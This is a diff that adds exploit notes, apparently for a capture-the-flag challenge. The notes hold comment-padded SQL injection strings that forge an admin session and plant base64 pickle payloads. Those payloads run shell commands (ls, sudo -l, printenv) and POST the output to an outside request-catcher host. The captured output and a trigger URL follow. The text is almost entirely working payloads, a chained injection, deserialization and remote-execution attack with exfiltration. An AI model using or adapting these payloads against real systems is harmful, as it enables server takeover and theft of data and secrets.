@@ -1,0 +1,23 @@
+# Create Session
+# \;INSERT/**/INTO/**/activesessions/**/(sessionid,/**/username,/**/timestamp)/**/values/**/(\abc\,/**/\admin\,/**/\123\);/**/--
+
+# Insert Code To Execute
+# \;INSERT/**/INTO/**/files/**/(filename,/**/data,/**/sessionid)/**/values/**/(\test15\,/**/\<B64-ENCODED-PAYLOAD-HERE>\,/**/\NULL\);/**/--
+
+# id
+#{"data": "moveable\n"}
+
+# ls -l
+# \;INSERT/**/INTO/**/files/**/(filename,/**/data,/**/sessionid)/**/values/**/(\test05\,/**/\gASVlwEAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUWHkBAABweXRob24zIC1jICJpbXBvcnQgaHR0cC5jbGllbnQsIGpzb24sIHN1YnByb2Nlc3M7IG91dHB1dCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFsnbHMnLCAnLWwnXSkuZGVjb2RlKCk7IGNvbm4gPSBodHRwLmNsaWVudC5IVFRQU0Nvbm5lY3Rpb24oJ2h1bnRyZXNzY3RmLnJlcXVlc3RjYXRjaGVyLmNvbScpOyBoZWFkZXJzID0geydDb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24vanNvbid9OyBwYXlsb2FkID0ganNvbi5kdW1wcyh7J2RhdGEnOiBvdXRwdXR9KTsgY29ubi5yZXF1ZXN0KCdQT1NUJywgJy90ZXN0JywgcGF5bG9hZCwgaGVhZGVycyk7IHJlc3BvbnNlID0gY29ubi5nZXRyZXNwb25zZSgpOyBwcmludChyZXNwb25zZS5yZWFkKCkuZGVjb2RlKCkpIpSFlFKULg==\,/**/\NULL\);/**/--
+#{"data": "total 16\n-rwxr-xr-x 1 root root 6092 Oct  7 18:28 app.py\n-rwxr-xr-x 1 root root  106 Oct  7 18:28 requirements.txt\ndrwxr-xr-x 1 root root 4096 Oct  7 18:28 templates\n"}
+
+# sudo -l
+# \;INSERT/**/INTO/**/files/**/(filename,/**/data,/**/sessionid)/**/values/**/(\test08\,/**/\gASVmQEAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUWHsBAABweXRob24zIC1jICJpbXBvcnQgaHR0cC5jbGllbnQsIGpzb24sIHN1YnByb2Nlc3M7IG91dHB1dCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFsnc3VkbycsICctbCddKS5kZWNvZGUoKTsgY29ubiA9IGh0dHAuY2xpZW50LkhUVFBTQ29ubmVjdGlvbignaHVudHJlc3NjdGYucmVxdWVzdGNhdGNoZXIuY29tJyk7IGhlYWRlcnMgPSB7J0NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJ307IHBheWxvYWQgPSBqc29uLmR1bXBzKHsnZGF0YSc6IG91dHB1dH0pOyBjb25uLnJlcXVlc3QoJ1BPU1QnLCAnL3Rlc3QnLCBwYXlsb2FkLCBoZWFkZXJzKTsgcmVzcG9uc2UgPSBjb25uLmdldHJlc3BvbnNlKCk7IHByaW50KHJlc3BvbnNlLnJlYWQoKS5kZWNvZGUoKSkilIWUUpQu\,/**/\NULL\);/**/-- 
+#{"data": "Matching Defaults entries for moveable on moveable-921940dc0582310b-6dfcf84478-fnpwg:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser moveable may run the following commands on moveable-921940dc0582310b-6dfcf84478-fnpwg:\n    (root) NOPASSWD: ALL\n"}
+
+# printenv -0
+# \;INSERT/**/INTO/**/files/**/(filename,/**/data,/**/sessionid)/**/values/**/(\test10\,/**/\gASVnQEAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUWH8BAABweXRob24zIC1jICJpbXBvcnQgaHR0cC5jbGllbnQsIGpzb24sIHN1YnByb2Nlc3M7IG91dHB1dCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFsncHJpbnRlbnYnLCAnLTAnXSkuZGVjb2RlKCk7IGNvbm4gPSBodHRwLmNsaWVudC5IVFRQU0Nvbm5lY3Rpb24oJ2h1bnRyZXNzY3RmLnJlcXVlc3RjYXRjaGVyLmNvbScpOyBoZWFkZXJzID0geydDb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24vanNvbid9OyBwYXlsb2FkID0ganNvbi5kdW1wcyh7J2RhdGEnOiBvdXRwdXR9KTsgY29ubi5yZXF1ZXN0KCdQT1NUJywgJy90ZXN0JywgcGF5bG9hZCwgaGVhZGVycyk7IHJlc3BvbnNlID0gY29ubi5nZXRyZXNwb25zZSgpOyBwcmludChyZXNwb25zZS5yZWFkKCkuZGVjb2RlKCkpIpSFlFKULg==\,/**/\NULL\);/**/--
+#{"data": "MAIL=/var/mail/moveable\u0000USER=moveable\u0000HOME=/home/moveable\u0000LOGNAME=moveable\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\u0000LANG=C.UTF-8\u0000SHELL=/bin/sh\u0000PWD=/home/moveable\u0000LC_ALL=C.UTF-8\u0000"}
+
+# Trigger Code
+# challenge.ctf.games:32510/download/test15/abc
